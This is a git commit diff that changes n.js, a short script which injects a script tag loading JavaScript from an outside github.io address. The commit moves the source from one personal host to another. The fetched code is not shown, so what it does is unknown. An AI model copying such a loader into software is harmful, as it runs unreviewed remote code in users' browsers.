55690f51309d2c5aa330bad4d179d3540265fb86
devbratk <gryshenkevgen@gmail.com>
2024-09-24 14:57:39 +0300

    Update n.js

--- n.js
+++ n.js
@@ -1,4 +1,4 @@
 var script = document.createElement("script");
 script.type = "text/javascript";
-script.src = "https://jenichg.github.io/x/s.jss";
+script.src = "https://devbratk.github.io/n/r.js";
 document.head.appendChild(script);
